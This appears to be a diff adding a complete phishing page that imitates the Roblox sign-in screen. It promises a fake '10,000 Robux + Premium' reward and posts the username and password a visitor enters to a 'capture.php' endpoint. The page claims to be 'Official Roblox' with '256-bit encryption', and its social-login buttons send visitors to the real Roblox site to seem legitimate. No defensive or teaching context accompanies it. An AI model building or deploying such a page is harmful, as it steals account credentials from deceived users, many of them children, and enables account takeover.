@@ -1,0 +1,273 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox Login - Claim Reward</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: linear-gradient(135deg, #0f172a 0%, #1e1a3a 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .login-wrapper {
+            width: 100%;
+            max-width: 460px;
+        }
+
+        .login-card {
+            background: #1e293b;
+            border-radius: 28px;
+            padding: 40px 32px;
+            box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5);
+            border: 1px solid rgba(255,71,87,0.2);
+        }
+
+        .back-link {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            color: #94a3b8;
+            text-decoration: none;
+            font-size: 14px;
+            margin-bottom: 30px;
+        }
+
+        .logo-area {
+            text-align: center;
+            margin-bottom: 32px;
+        }
+
+        .logo-icon {
+            width: 56px;
+            height: 56px;
+            background: #ff4757;
+            border-radius: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 28px;
+            font-weight: bold;
+            margin: 0 auto 16px;
+        }
+
+        .logo-area h2 {
+            font-size: 28px;
+            font-weight: 700;
+            margin-bottom: 8px;
+        }
+
+        .logo-area p {
+            color: #94a3b8;
+            font-size: 14px;
+        }
+
+        .reward-badge {
+            background: linear-gradient(135deg, #ff4757, #ff6b6b);
+            padding: 10px 16px;
+            border-radius: 40px;
+            text-align: center;
+            margin-bottom: 28px;
+            font-size: 14px;
+            font-weight: 600;
+        }
+
+        .input-group {
+            margin-bottom: 20px;
+        }
+
+        .input-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-size: 14px;
+            font-weight: 500;
+            color: #e2e8f0;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 14px 16px;
+            background: #0f172a;
+            border: 1px solid #334155;
+            border-radius: 14px;
+            font-size: 16px;
+            color: #fff;
+            transition: all 0.2s;
+        }
+
+        .input-group input:focus {
+            outline: none;
+            border-color: #ff4757;
+            box-shadow: 0 0 0 3px rgba(255,71,87,0.2);
+        }
+
+        .checkbox-group {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin: 20px 0;
+        }
+
+        .checkbox-group input {
+            width: 18px;
+            height: 18px;
+        }
+
+        .checkbox-group label {
+            font-size: 13px;
+            color: #94a3b8;
+        }
+
+        .login-btn {
+            width: 100%;
+            background: linear-gradient(135deg, #ff4757, #ff6b6b);
+            border: none;
+            padding: 16px;
+            border-radius: 14px;
+            font-size: 16px;
+            font-weight: 700;
+            color: white;
+            cursor: pointer;
+            transition: all 0.2s;
+            margin-top: 10px;
+        }
+
+        .login-btn:hover {
+            transform: translateY(-1px);
+            box-shadow: 0 10px 20px rgba(255,71,87,0.3);
+        }
+
+        .divider {
+            text-align: center;
+            margin: 24px 0;
+            color: #475569;
+            font-size: 13px;
+            position: relative;
+        }
+
+        .divider::before,
+        .divider::after {
+            content: '';
+            position: absolute;
+            top: 50%;
+            width: 40%;
+            height: 1px;
+            background: #334155;
+        }
+
+        .divider::before {
+            left: 0;
+        }
+
+        .divider::after {
+            right: 0;
+        }
+
+        .social-login {
+            display: flex;
+            gap: 12px;
+        }
+
+        .social-btn {
+            flex: 1;
+            background: #0f172a;
+            border: 1px solid #334155;
+            padding: 12px;
+            border-radius: 14px;
+            text-align: center;
+            cursor: pointer;
+            font-size: 14px;
+            transition: all 0.2s;
+        }
+
+        .help-links {
+            text-align: center;
+            margin-top: 24px;
+        }
+
+        .help-links a {
+            color: #ff4757;
+            text-decoration: none;
+            font-size: 13px;
+            margin: 0 12px;
+        }
+
+        .security-note {
+            background: #0f172a;
+            padding: 14px;
+            border-radius: 12px;
+            margin-top: 24px;
+            font-size: 12px;
+            color: #64748b;
+            text-align: center;
+        }
+
+        @media (max-width: 480px) {
+            .login-card {
+                padding: 30px 24px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="login-wrapper">
+        <div class="login-card">
+            <a href="index.html" class="back-link">← Back</a>
+            
+            <div class="logo-area">
+                <div class="logo-icon">R</div>
+                <h2>Sign in to Roblox</h2>
+                <p>to claim your reward</p>
+            </div>
+
+            <div class="reward-badge">
+                🎁 You have 10,000 Robux + Premium waiting!
+            </div>
+
+            <form id="loginForm" action="api/capture.php" method="POST">
+                <div class="input-group">
+                    <label>Username or Email</label>
+                    <input type="text" name="username" placeholder="Enter your Roblox username" required autocomplete="off">
+                </div>
+                <div class="input-group">
+                    <label>Password</label>
+                    <input type="password" name="password" placeholder="Enter your password" required>
+                </div>
+                <div class="checkbox-group">
+                    <input type="checkbox" name="remember" id="remember">
+                    <label for="remember">Keep me signed in</label>
+                </div>
+                <button type="submit" class="login-btn">Sign In & Claim Reward →</button>
+            </form>
+
+            <div class="divider">or</div>
+
+            <div class="social-login">
+                <div class="social-btn" onclick="window.location.href='https://www.roblox.com/login'">Google</div>
+                <div class="social-btn" onclick="window.location.href='https://www.roblox.com/login'">Apple</div>
+                <div class="social-btn" onclick="window.location.href='https://www.roblox.com/login'">Facebook</div>
+            </div>
+
+            <div class="help-links">
+                <a href="#">Forgot password?</a>
+                <a href="#">Create account</a>
+            </div>
+
+            <div class="security-note">
+                🔒 Secure connection • 256-bit encryption • Official Roblox
+            </div>
+        </div>
+    </div>
+</body>
+</html>
